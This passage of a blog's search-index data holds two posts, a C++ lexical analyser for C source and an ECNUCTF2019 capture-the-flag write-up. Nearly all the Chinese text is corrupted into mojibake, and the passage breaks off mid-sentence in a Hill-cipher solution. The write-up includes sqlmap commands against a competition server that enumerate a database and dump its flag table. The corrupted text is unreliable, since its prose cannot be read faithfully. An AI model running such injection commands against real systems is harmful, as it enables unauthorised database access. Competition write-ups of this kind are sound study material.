è¿™ä¸¤æ¡éƒ½æ˜¯å®è®­é¢˜äººä¸ºè§„å®šçš„ã€‚ç¬¬ä¸€æ¡æˆ–è®¸è¿˜èƒ½ç†è§£ï¼Œä½†æ˜¯çœŸæ­£å®ç°èµ·æ¥ä¼šæ˜¯ä»£ç å¤æ‚å¾ˆå¤šï¼Œå› æ­¤æˆ‘åœ¨ä»£ç é‡Œæš´åŠ›ç»•è¿‡äº†è¿™ä¸ªé™åˆ¶ã€‚ æ³¨ï¼šä¸ºä»€ä¹ˆè¯´å®ç°ç¬¬ä¸€æ¡æ¯”è¾ƒå¤æ‚ï¼Ÿ è¿™ä¸ä»…æ˜¯å› ä¸º C è¯­è¨€ä¸­å­˜åœ¨ % è¿ç®—ç¬¦ï¼Œå³å–æ¨¡ï¼Œè¿˜å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æœ¬èº«ååˆ†çµæ´»ã€‚ä¸å¦¨è€ƒè™‘é‡åˆ°å¦‚ä¸‹å…­ç§æ¨¡å¼æ—¶å¦‚ä½•åŒ¹é…ï¼š printf(\"%d, i\") æ™®é€šæƒ…å†µ printf(\"%-5d\", i) å³å¯¹é½ï¼Œæˆ–è€…é«˜ä½è¡¥ 0 ç­‰æ“ä½œ printf(\"%.2f\", i) æµ®ç‚¹æ•°ç²¾åº¦ printf(\"%d %d %d\", i, j, k) å¤šä¸ªç©ºæ ¼éš”å¼€çš„ %d ä½¿å¾—è¯†åˆ« % å‰é¢çš„ \" æ¥åˆ¤æ–­æ˜¯å¦åœ¨å­—ç¬¦ä¸²å†…å˜å¾—ä¸å¯è¡Œ printf(\"50%% %d\", i) å–æ¨¡ç¬¦å·æœ¬èº«çš„è½¬ä¹‰ a = a % d å­—ç¬¦ä¸²å¤–çš„å–æ¨¡ç¬¦å· è§£å†³æ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼šè®°å½• \" çš„å¼€é—­çŠ¶æ€æ¥åˆ¤æ–­å½“å‰çš„ % æ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå¯¹ %-ï¼Œ%. å’Œ %% ç‰¹åˆ¤ã€‚ä½†æ˜¯è¿™æ ·å°±æœ‰ç‚¹å¤æ‚äº†ã€‚ ç¬¬äºŒæ¡å°±æ¶å¿ƒå¾—å¤šäº†ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œå¤„ç†æ³¨é‡Šçš„æœ€å¥½æ–¹æ³•æ˜¯åœ¨ä¸€å¼€å§‹å°±åˆ æ‰å®ƒï¼ˆæˆ‘æœ€åˆä¹Ÿæ˜¯è¿™ä¹ˆåšçš„ï¼‰ï¼Œç„¶è€Œç”±äºç¬¬äºŒæ¡è§„å®šçš„å­˜åœ¨ï¼Œæˆ‘ä¸å¾—ä¸ä½¿ç”¨ä¸€äº›å°æŠ€å·§æ¥è¾¾åˆ°è¦æ±‚ã€‚è¿™ä¹Ÿæ˜¯è¿™æ¬¡èµ°è¿œäº†çš„ä¸»è¦åŸå› ï¼Œä¸ºæ­¤æˆ‘å¤šèŠ±äº†ä¸€ä¸ªå°æ—¶ã€‚å…³äºè¿™äº›æŠ€å·§ä¼šåœ¨åé¢è¯¦è¿°ã€‚ ","date":"2019-04-11","objectID":"/lex-analysis/:1:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"èµ°è¿œäº†çš„è¯æ³•åˆ†æå™¨","uri":"/lex-analysis/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ€è·¯ ä»£ç çš„ä¸»è¦æ€æƒ³æ˜¯ç”¨ map å­˜è¯ç´ å¯¹åº”ç¼–å·ï¼Œå€ŸåŠ© stringstream å¯¹è±¡æŒ‰ç©ºç™½ç¬¦åˆ†éš”ç¨‹åºè¯­å¥é€æ¡å¤„ç†ï¼ˆç„¶è€Œè¿™å¹¶æ²¡æœ‰å¤šå¤§ç”¨ï¼Œå› ä¸º C è¯­è¨€å¾ˆå¤šåœ°æ–¹æ˜¯å…è®¸ä¸ç©ºæ ¼çš„ï¼Œæˆ‘æœ€åè¿˜æ˜¯å¾—é€å­—ç¬¦åˆ†æï¼‰ã€‚ å¯¹äºæ•°å­—å¼€å¤´çš„ä¸€æ®µå­—ç¬¦ï¼Œå¯ä»¥ç¡®å®šç›´åˆ°éæ•°å­—å­—ç¬¦ä¹‹å‰éƒ½æ˜¯åŒä¸€ä¸ªæ•°å­—ï¼Œç®—ä½œä¸€ä¸ªè¯ç´ ã€‚ å¦‚æœæˆ‘ä»¬è¿æ°”è¶³å¤Ÿå¥½ï¼ˆç¼–è¯‘ä»£ç é£æ ¼è¾ƒå¥½çš„ C ä»£ç ï¼‰ï¼Œstringstream åˆ†å‡ºæ¥çš„è¯­å¥å¤§å¤šèƒ½åŒ¹é…ä¸Š map é‡Œçš„è¯ç´ ã€‚ä¸è¿‡å®é™…æƒ…å†µä¸­æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿™æ˜¯å°æ¦‚ç‡äº‹ä»¶ï¼Œæ‰€ä»¥æ”¾åœ¨äº† else è€Œä¸æ˜¯ if é‡Œã€‚ æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹åˆ†ç¦»å‡ºæ¥çš„è¿™ä¸€å°æ®µ cur ä½œæ‰«æäº†ï¼Œæœ¬æ¥å¯ä»¥ç”¨é€’å½’ä¼˜é›…åœ°æ‰«æï¼Œç„¶è€Œå¦‚æœå‡ºç°å¾ˆé•¿ä¸€æ®µæ²¡æœ‰ç©ºæ ¼çš„è¯­å¥ï¼Œé€’å½’å¯èƒ½ä½¿æ ˆæº¢å‡ºï¼Œå› æ­¤è¿™é‡Œé‡‡ç”¨å¾ªç¯æ¥æ›¿ä»£ã€‚å…ˆä»å·¦è‡³å³åŒ¹é… map é‡Œçš„è¯ç´ ï¼Œç›´åˆ°ç¬¬ä¸€æ¬¡åŒ¹é…æˆåŠŸã€‚ åŒ¹é…æˆåŠŸå¹¶æ²¡æœ‰ç»“æŸï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œè´ªå©ªåŒ¹é…ã€‚ä¸¾ä¸ªæ —å­ï¼Œ\u003c\u003c= å¯ä»¥åŒ¹é… \u003cï¼Œ\u003c\u003c å’Œ \u003c\u003c= ä¸‰ä¸ªè¯ç´ ï¼Œæ˜¾ç„¶æˆ‘ä»¬åº”åŒ¹é…æœ€åä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯å°½å¯èƒ½é•¿çš„é‚£ä¸ªè¯ç´ ã€‚åŒ¹é…å®Œæˆåè¾“å‡ºï¼Œå¹¶è·³è¿‡å·²åŒ¹é…çš„é‚£ä¸€æ®µç»§ç»­ã€‚ ä¹Ÿæœ‰å¯èƒ½æˆ‘ä»¬åœ¨ç¬¬ 3 æ­¥æ ¹æœ¬æ— æ³•åŒ¹é…æˆåŠŸï¼Œè¿™è¯´æ˜è¯¥ä¸²ä»¥æ ‡è¯†ç¬¦å¼€å¤´ï¼Œä¾‹å¦‚ main()ï¼Œå› æ­¤æˆ‘ä»¬æŠŠæ ‡è¯†ç¬¦åæ‹¿å‡ºæ¥ä»¥åå†ç»§ç»­ã€‚æ–¹æ³•æ˜¯æ‰«æè‡³ç¬¬ä¸€ä¸ªä¸æ˜¯ä¸‹åˆ’çº¿ / å­—æ¯ / æ•°å­—çš„å­—ç¬¦ä¸ºæ­¢ã€‚ æœ¬æ¥è¿™æ ·å°±ç»“æŸäº†ï¼Œæˆ‘å¯ä»¥é«˜é«˜å…´å…´åœ°åˆ æ‰æ³¨é‡Šã€trim æ‰ä¸¤è¾¹ç©ºæ ¼ã€å¤„ç†ä¸‹æœ€åä¸€è¡Œä¸èƒ½æ¢è¡Œçš„æ— èŠé—®é¢˜åå°±æå®šçš„ã€‚ç„¶è€Œã€‚ã€‚ã€‚ä¸ºä»€ä¹ˆæ³¨é‡Šè¦è¢«å½“ä½œè¯ç´ æ‰“å°å‡ºæ¥ï¼Ÿï¼Ÿè¿™ç§åšæ³•å®Œå…¨æ˜¯ä¸åˆç†è€Œä½æ•ˆçš„ã€‚ ","date":"2019-04-11","objectID":"/lex-analysis/:2:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"èµ°è¿œäº†çš„è¯æ³•åˆ†æå™¨","uri":"/lex-analysis/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ³¨é‡Šçš„å¤„ç† ä»£ç é•¿åº¦å› ä¸ºå¤„ç†æ¯«æ— å¤„ç†å¿…è¦çš„æ³¨é‡Šå¢åŠ äº†è®¸å¤šã€‚é¦–å…ˆåœ¨æ¸…é™¤æ³¨é‡Šæ—¶ï¼ˆå¯¹ï¼Œæˆ‘ä¸€å®šè¦æ¸…é™¤æ³¨é‡Šï¼‰å…ˆæŠŠæ³¨é‡Šå†…å®¹æŒ‰å•è¡Œ / å¤šè¡Œä¿å­˜åˆ°ä¸¤ä¸ªæ•°ç»„é‡Œï¼Œéšåæ˜¯æ‚æŠ€è¡¨æ¼”æ—¶é—´ï¼š å¯¹äºå•è¡Œæ³¨é‡Šï¼Œç”¨ @n æ›¿æ¢åŸæ³¨é‡Šï¼Œå› ä¸º @ è¿™ä¸ªç¬¦å·åœ¨ C æºä»£ç é‡Œæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šå«ä¹‰ï¼Œä¹Ÿä¸èƒ½åœ¨æ ‡è¯†ç¬¦ä¸­å‡ºç°ï¼ˆ$ æ˜¯å¯ä»¥çš„ï¼Œæœ‰ç‚¹å¥‡æ€ªï¼‰ã€‚å…¶ä¸­ n è¡¨ç¤ºè¿™æ˜¯ç¬¬ n ä¸ªå•è¡Œæ³¨é‡Šã€‚ å¯¹äºå¤šè¡Œæ³¨é‡ŠåŒç†ï¼Œç”¨ `n æ›¿æ¢åŸæ³¨é‡Šã€‚ äºæ˜¯æ‰«ææ—¶ï¼Œå½“æˆ‘ä»¬å‘ç°ä¸€ä¸ªè¯­å¥æ— æ³•åŒ¹é…è¯ç´ ã€ä¸”æˆªå–æ ‡è¯†ç¬¦ä¹Ÿæ²¡æœ‰å˜åŠ¨ä¸‹æ ‡æ—¶ï¼Œåªå¯èƒ½æ˜¯é‡åˆ°äº†å•å­—æ¯å˜é‡ï¼Œæˆ–è€…æ˜¯æˆ‘ä»¬ä½œçš„è¿™ä¸¤ä¸ªæ ‡è®°ä¹‹ä¸€ã€‚isalpha æ’é™¤æ‰å‰è€…æƒ…å†µï¼Œè¿™æ—¶æ‹¿å‡ºåˆšæ‰æ•°ç»„é‡Œå­˜çš„å¯¹åº”æ³¨é‡Šå†…å®¹ï¼Œæ‰“å°è¾“å‡ºå³å¯ã€‚ è¿™ç§æ‚æŠ€çœ‹ä¼¼å¥½ç©ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯èµ°è¿œäº†ä¹‹åçš„æ— å¥ˆä¹‹ä¸¾ï¼Œæˆ‘è§‰å¾—è‚¯å®šæ˜¯å­˜åœ¨éšæ‚£çš„ï¼Œä¹Ÿå¹¶ä¸åˆ©äºç»´æŠ¤ã€‚å› æ­¤å¼ºçƒˆä¸æ¨èç”¨è¿™ç§æ–¹æ³•ï¼Œç›´æ¥æ¸…é™¤æ³¨é‡Šçš„åŠæ³•é«˜åˆ°ä¸çŸ¥é“å“ªé‡Œå»äº†ã€‚ ","date":"2019-04-11","objectID":"/lex-analysis/:3:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"èµ°è¿œäº†çš„è¯æ³•åˆ†æå™¨","uri":"/lex-analysis/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"C++ ä»£ç  ä¸åˆ° 200 è¡Œã€‚ // C è¯­è¨€è¯æ³•åˆ†æå™¨ #include \u003ccstdio\u003e#include \u003ccstring\u003e#include \u003ciostream\u003e#include \u003cmap\u003e#include \u003cstring\u003e#include \u003cfstream\u003e#include \u003csstream\u003e#include \u003cvector\u003eusing namespace std; /* ä¸è¦ä¿®æ”¹è¿™ä¸ªæ ‡å‡†è¾“å…¥å‡½æ•° */ void read_prog(string\u0026 prog) { char c; while(scanf(\"%c\",\u0026c)!=EOF){ prog += c; } } /* ä½ å¯ä»¥æ·»åŠ å…¶ä»–å‡½æ•° */ map\u003cstring, int\u003e tokens = { {\"auto\", 1}, {\"break\", 2}, {\"case\", 3}, {\"char\", 4}, {\"const\", 5}, {\"continue\", 6}, {\"default\", 7}, {\"do\", 8}, {\"double\", 9}, {\"else\", 10}, {\"enum\", 11}, {\"extern\", 12}, {\"float\", 13}, {\"for\", 14}, {\"goto\", 15}, {\"if\", 16}, {\"int\", 17}, {\"long\", 18}, {\"register\", 19}, {\"return\", 20}, {\"short\", 21}, {\"signed\", 22}, {\"sizeof\", 23}, {\"static\", 24}, {\"struct\", 25}, {\"switch\", 26}, {\"typedef\", 27}, {\"union\", 28}, {\"unsigned\", 29}, {\"void\", 30}, {\"volatile\", 31}, {\"while\", 32}, {\"-\", 33}, {\"--\", 34}, {\"-=\", 35}, {\"-\u003e\", 36}, {\"!\", 37}, {\"!=\", 38}, {\"%\", 39}, {\"%=\", 40}, {\"\u0026\", 41}, {\"\u0026\u0026\", 42}, {\"\u0026=\", 43}, {\"(\", 44}, {\")\", 45}, {\"*\", 46}, {\"*=\", 47}, {\",\", 48}, {\".\", 49}, {\"/\", 50}, {\"/=\", 51}, {\":\", 52}, {\";\", 53}, {\"?\", 54}, {\"[\", 55}, {\"]\", 56}, {\"^\", 57}, {\"^=\", 58}, {\"{\", 59}, {\"|\", 60}, {\"||\", 61}, {\"|=\", 62}, {\"}\", 63}, {\"~\", 64}, {\"+\", 65}, {\"++\", 66}, {\"+=\", 67}, {\"\u003c\", 68}, {\"\u003c\u003c\", 69}, {\"\u003c\u003c=\", 70}, {\"\u003c=\", 71}, {\"=\", 72}, {\"==\", 73}, {\"\u003e\", 74}, {\"\u003e=\", 75}, {\"\u003e\u003e\", 76}, {\"\u003e\u003e=\", 77}, {\"\\\"\", 78}, {\"%d\", 81}, {\"%s\", 81}, {\"%c\", 81}, {\"%f\", 81}, {\"%lf\", 81} }; string cur, tmp; int len, cnt; bool show_time; vector\u003cstring\u003e annos[2]; /* æ‰“å°å¸¸æ•°ï¼Œè¾“å‡ºè‡³éæ•°å­—å­—ç¬¦ */ void print_num(int \u0026idx) { if (show_time) cout \u003c\u003c endl; cout \u003c\u003c++cnt \u003c\u003c\": \u003c\" \u003c\u003c cur[idx++]; while (isdigit(cur[idx])) { cout \u003c\u003ccur[idx++]; } cout \u003c\u003c\",80\u003e\"; } /* æ‰“å°éå¸¸æ•°è¯ç´  */ inline void print_token(const string \u0026token, const int \u0026id) { if (show_time) cout \u003c\u003c endl; // å¤„ç†æœ€åæ¢è¡Œé—®é¢˜ cout \u003c\u003c++cnt \u003c\u003c\": \u003c\" \u003c\u003c token \u003c\u003c\",\"\u003c\u003c id \u003c\u003c\"\u003e\"; } /* æ¸…é™¤æ‰€æœ‰æ³¨é‡Š */ void rip_anno(string\u0026 prog) { int pos = 0, from, to; while ((from = prog.find(\"//\", pos)) != string::npos) { to = prog.find('\\n', from); annos[0].push_back(prog.substr(from, to-from)); // å…ˆä¿å­˜æ³¨é‡Šå†…å®¹ prog.erase(from, to-from); prog.insert(from,\"@\"+ to_string(annos[0].size())); // æ’å…¥å•è¡Œæ³¨é‡Šæ ‡è®° @ } pos = 0; while ((from = prog.find(\"/*\", pos)) != string::npos) { to = prog.find(\"*/\", from); annos[1].push_back(prog.substr(from, to-from+2)); prog.erase(from, to-from+2); prog.insert(from,\"`\"+ to_string(annos[1].size())); // æ’å…¥å¤šè¡Œæ³¨é‡Šæ ‡è®° ` } prog.erase(prog.find_last_not_of(\" \\n\\r\\t\") + 1); // åˆ é™¤å°¾éƒ¨ç©ºæ ¼ } void Analysis() { string prog = \"int main()\\n{\\nprintf(\\\"HelloWorld\\\");\\nreturn 0;\\n}\"; //read_prog(prog); rip_anno(prog); istringstream ss(prog); // ç”¨ç©ºæ ¼åˆ†éš”æ¯æ¬¡è¯»å…¥ while (!ss.eof()) { ss \u003e\u003e cur; len = cur.length(); for (int i = 0; i \u003c len;) { /* æ¯æ¬¡ for å¾ªç¯å¼€å§‹æ—¶ï¼Œå¿…å®šæ˜¯æ–°è¯ç´  */ if (isdigit(cur[i])) { print_num(i); } else { if (tokens[cur] == 0) { // ç”¨ç©ºæ ¼åˆ†éš”å‡ºçš„ä¸²ä¸èƒ½ç›´æ¥åŒ¹é…è¯ç´  // æç«¯æƒ…å†µå¦‚ï¼šfor(var=0;var\u003c10;++var){...;...;}ï¼Œé€’å½’å¤„ç†å¯èƒ½çˆ†æ ˆï¼Œå› æ­¤ç”¨å¾ªç¯ int j = 1, k; while (i + j \u003c= len \u0026\u0026 tokens[cur.substr(i, j)] == 0) ++j; // ä»å·¦è‡³å³å°è¯•åŒ¹é…è¯ç´ ï¼Œç›´åˆ°ç¬¬ä¸€æ¬¡åŒ¹é…æˆåŠŸ if (i + j\u003e len) { // æ•´ä¸ªä¸²éƒ½æ— æ³•åŒ¹é…ï¼Œå› æ­¤ä¸²ä»¥æ ‡è¯†ç¬¦å¼€å¤´ for (k = i; k \u003c len \u0026\u0026 (cur[k] == '_' || isalnum(cur[k])); ++k); // æˆªå–æ ‡è¯†ç¬¦å if (k == i \u0026\u0026 !isalpha(cur[k])) { // ç‰¹åˆ¤ï¼šè¿™é‡Œå¯èƒ½æ˜¯å•å­—æ¯å˜é‡ï¼Œæˆ–æˆ‘ä»¬åŠ çš„æ³¨é‡Šæ ‡è®° print_token(annos[cur[k] == '@' ? 0 : 1][cur[k+1]-1 - '0'], 79); i = min(len, k + 2); // ä¸ºä»€ä¹ˆè¯æ³•åˆ†æå™¨è¦æŠŠæ³¨é‡Šå½“è¯ç´ å¤„ç†è€Œä¸æ˜¯ç›´æ¥æ¸…é™¤æ³¨é‡Šï¼Ÿå¤šæ­¤ä¸€ä¸¾ } else { print_token(cur.substr(i, k - i), 81); i = k; } } else { while (i + j \u003c= len \u0026\u0026 tokens[cur.substr(i, j)] != 0) ++j; // æˆåŠŸåŒ¹é…åï¼Œè¿›è¡Œè´ªå©ªåŒ¹é… tmp = cur.substr(i, j - 1); print_token(tmp, tokens[tmp]); i += j - 1; // è·³è¿‡å·²è¢«è´ªå©ªåŒ¹é…çš„è¯ç´ å¹¶ç»§ç»­ } } else { print_token(cur, tokens[cur]); show_time = true; break; } } show_time = true; // ç¬¬ä¸€ä¸ªè¯ç´ å·²ç»æ‰“å°äº†ï¼ } } } ","date":"2019-04-11","objectID":"/lex-analysis/:4:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"èµ°è¿œäº†çš„è¯æ³•åˆ†æå™¨","uri":"/lex-analysis/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç¬¬äºŒæ¬¡å‚åŠ  CTFï¼Œä¸Šæ¬¡å‚åŠ æ—¶è¿˜åªçŸ¥é“å¤å…¸å¯†ç ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:0:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"åæ§½ åœ¨å‘¨å…­ 8 ç‚¹èµ·åºŠä¸æ˜¯æˆ‘çš„é£æ ¼ï¼Œä½†è¿™å‘¨å…­æˆ‘è¿˜æ˜¯åšåˆ°äº†ã€‚9 ç‚¹å¼€å§‹æ¯”èµ›ï¼Œåˆ°æ™šä¸Šè¿‘ 10 ç‚¹æ‰å…³æ‰æ¯”èµ›ç½‘é¡µã€‚åˆé¥­ç‚¹äº†å¤–å–ï¼Œå‚æ™šè·‘äº†ä¸ªæ­¥å›å®¶åƒæ™šé¥­ï¼Œæœ‰æ•ˆæ¯”èµ›æ—¶é—´å¤§æ¦‚åœ¨ 10 å°æ—¶å·¦å³ã€‚ ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œç°åœ¨çš„ CTF æ¯”èµ›å±…ç„¶æœ‰ç†è®ºé¢˜äº†ï¼Œéƒ½æ˜¯ç½‘å®‰çŸ¥è¯†ä¸è¿‡èŒƒå›´æ¯”è¾ƒå¹¿ï¼Œè®¸å¤šé¢˜å¾—é æœç´¢å¼•æ“å¸®å¿™â€¦â€¦ åšç†è®ºé¢˜åšåˆ°ä¸€åŠç½‘ç«™å°±ååˆ†å¡ï¼Œæ„Ÿè§‰æ˜¯è¢«äºº DDOS äº†ã€‚åˆ°äº†è¿‘åç‚¹æƒ³äº¤ç†è®ºé¢˜çš„æ—¶å€™å±…ç„¶äº¤ä¸ä¸Šäº†ï¼Œçœ‹æ¥ä¸»åŠæ–¹è¢« D äº†ä¸ªæªæ‰‹ä¸åŠï¼Œå¥½åœ¨ä¿®å¤è¿˜ç®—åŠæ—¶ï¼Œå¾ˆå¿«å°±äº¤ä¸Šäº†ã€‚ çœŸæ­£çš„ CTF é¢˜åœ¨ 10 ç‚¹å‡†æ—¶å¼€æ”¾ï¼Œç„¶è€Œæ‰€æœ‰é¢˜éƒ½æ”¾åœ¨äº†åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œè€Œè¿™ä¸ªæœåŠ¡å™¨åˆä¸€æ¬¡é­å—äº†æ¶æ„æ”»å‡»ï¼Œå¯¼è‡´æ‰€æœ‰äººéƒ½çœ‹ä¸åˆ°é¢˜ï¼ˆåªèƒ½æ¬£èµé¢˜é¢ç²¾è‡´çš„æ–‡æ¡ˆï¼‰ã€‚æˆ‘çŒœè¿ç»´è‚¯å®šä¸€è„¸æ‡µé€¼ï¼Œä»¥è‡´äºåœ¨æˆ‘ä»¬å¤±æœ›åœ°ç­‰å¾…äº†åå‡ åˆ†é’Ÿåèµ›é¢˜æ‰æ¢å¤æ­£å¸¸ã€‚åœ¨æ­¤æœŸé—´ï¼Œç§¯åˆ†æ¦œå´æ˜¯å¼€æ”¾çš„ï¼Œä¸Šé¢å…¨éƒ½æ˜¯é€‰æ‰‹å®åã€‚ã€‚ã€‚ååˆ†æ— è¯­ï¼Œç°åœ¨æˆ‘åº”è¯¥ä¸çŸ¥é“è¢«ç¤¾å·¥å¤šå°‘æ¬¡äº†ã€‚ ç­‰å¾…ç½‘ç«™æ¢å¤æ—¶å‘ç°ç¬¬ä¸‰é¢˜é¢˜é¢çš„å›¾ç‰‡å¾ˆæœ‰è¶£ï¼Œçœ‹èµ·æ¥åƒæ˜¯å¸®åŠ©è§£é¢˜çš„å…³é”®çº¿ç´¢ï¼š å›¾ 1 \" å›¾ 1 é€šè¿‡ Google å›¾ç‰‡æœç´¢ï¼Œæˆ‘åœ¨ è¿™é‡Œ å‘ç°äº†ç›¸å…³ä»‹ç»ï¼Œä¸è¿‡åæ¥äº‹å®è¯æ˜è¿™è·Ÿè§£é¢˜ä¸€ç‚¹å…³ç³»ä¹Ÿæ²¡æœ‰ã€‚ ä¸‹é¢æ˜¯ writeup æ­£æ–‡ï¼Œå¤§éƒ¨åˆ†ç»“æœéƒ½æ˜¯ç”±é˜Ÿå‹å¯å‘å¾—åˆ°çš„ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:1:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"1. åœŸè‚¥åŸè´¤äºŒ å›¾ 2 \" å›¾ 2 æ˜¾ç„¶è¿™é‡Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“ï¼Œè€ƒè™‘ SQL æ³¨å…¥æ”»å‡»ã€‚è¾“å…¥ 1 æŸ¥è¯¢åå‘ç° payload å¯ä»¥æ„é€ ä¸º gid=1ï¼Œç„¶å Kali ä¸‹è¿è¡Œ sqlmap å¯ä»¥ç›´æ¥å¾—åˆ° flagã€‚ $ sqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' --current-db # current database: luozhen $ sqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen --tables # tables in database luozhen: flag, good $ sqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen -T flag --columns # columns in table flag: flag, id $ sqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen -T flag -C flag,id --dump ","date":"2019-03-31","objectID":"/ecnuctf2019/:2:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"2. å´ä½©å­š å›¾ 3 \" å›¾ 3 ç½‘é¡µå†…çš„å­—ç¬¦ä¸²ç¬¦åˆå…¸å‹çš„ Base64 ç¼–ç çš„æ ¼å¼ï¼Œè§£ç å¾—åˆ° jsfuck ä»£ç ï¼Œåœ¨æµè§ˆå™¨ Console ä¸­è¿è¡Œå³å¾—åˆ° flagã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:3:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"3. æ­»äº¡çœŸç›¸ å‘é¢˜ï¼Œé¢˜é¢å’ŒéŸ³é¢‘ç–¯ç‹‚æš—ç¤ºæ‘©æ–¯ç”µç ï¼Œä½†å®é™…ä¸Šè·Ÿæ‘©æ–¯ç”µç æ ¹æœ¬æ²¡æœ‰å…³ç³»ã€‚å¬éŸ³é¢‘å¬ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œäºæ˜¯ç”¨ Cool Edit Pro æ‰“å¼€å¹¶æŸ¥çœ‹é¢‘è°±å›¾ï¼š å›¾ 4 \" å›¾ 4 ç„¶è€Œå°è¯•æäº¤åå‘ç°ä¸æ˜¯ flagã€‚ æ³¨æ„åˆ°ä¸‰ä¸ªä¸‹åˆ’çº¿æœ‰å¼‚æ ·ï¼ŒçŒœæƒ³å®ƒä»¬æ˜¯ flag ä¸­çš„ç©ºç¼ºå­—ç¬¦ã€‚çˆ†ç ´éš¾åº¦è¾ƒå¤§ï¼Œå› æ­¤å¤§èƒ†çŒœæµ‹ä¸‰ä¸ªä¸‹åˆ’çº¿è¡¨ç¤ºçš„æ˜¯åŒä¸€ä¸ªæ•°å­—ã€‚ä» 0 å¼€å§‹å°è¯•åˆ° 9 ä½†éƒ½ä¸æ˜¯æ­£ç¡®çš„ flagã€‚ è§‚å¯Ÿæ–°å¾—åˆ°çš„ flag å€¼ï¼Œå‘ç°å…¶é•¿åº¦æ°å¥½ä¸º 32 ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ md5 ç®—æ³•å“ˆå¸Œçš„ç»“æœå½¢å¼ä¸€è‡´ã€‚åœ¨ è¿™ä¸ªç¥å¥‡çš„ç½‘ç«™ å°è¯• md5 è§£å¯†å¾—åˆ° flagï¼Œå³ä¸‹åˆ’çº¿è¡¨ç¤º 0ã€‚ æ³¨ï¼šå³é”®æŸ¥çœ‹éŸ³é¢‘å±æ€§å¯ä»¥çœ‹åˆ°ä¸¤ä¸ª zero ä¸€ä¸ª 0ï¼Œæ—©ç‚¹çœ‹åˆ°å°±ä¸ç”¨è¯•é‚£ä¹ˆå¤šæ¬¡äº†ã€‚ã€‚è€Œä¸”å³ä½¿ä¿ç•™ä¸‹åˆ’çº¿è¿›è¡Œ md5 è§£å¯†åŒæ ·å¯ä»¥è·å¾— flagï¼Œä½†æ˜¯è¦æƒ³åˆ° md5 å¹¶ä¸å®¹æ˜“ï¼Œç•¥å‘ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:4:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"4. æ—¥å†›ç©ºè¢­ ç½‘é¡µä¸­çš„å†…å®¹æ˜æ˜¾æ˜¯ Base64 ç¼–ç ï¼Œè¿›è¡Œå¤šæ¬¡è§£ç ï¼ˆç¬¬ä¸€æ¬¡è§£ç æ— è¾“å‡ºï¼Œå°è¯•ç»“å°¾åŠ ä¸€ä¸ª / ä¸¤ä¸ªç­‰å·å°±å¯ä»¥è§£ç äº†ï¼‰å¹¶ Unescape åï¼Œé‡æ–°æ’åˆ—å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œè·å¾— flagã€‚ å›¾ 5 \" å›¾ 5 ","date":"2019-03-31","objectID":"/ecnuctf2019/:5:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"5. é£è™é˜Ÿ å¤©å‘ï¼Œå‚è€ƒäº† è¿™ç¯‡åšå®¢ã€‚ å¯¹å¸Œå°”çŸ©é˜µæ±‚é€†ã€é€šåˆ†ã€æ¨¡ 26 æ„ä¹‰ä¸‹åŠ æ³•åï¼Œå¾—åˆ°è§£å¯†çŸ©é˜µï¼š 8 16 27 8 99 24 27 24 27 å°†å¯†æ–‡ 3 ä¸ªå­—ç¬¦åˆ†ä¸ºä¸€ç»„ï¼Œè½¬ä¸º ASCII ç åå†ä¹˜ä»¥è§£å¯†çŸ©é˜µï¼Œå†æ¨¡ 26 å¯¹åº”åˆ°è‹±æ–‡å­—æ¯ï¼Œå°±å¯ä»¥å¾—åˆ° 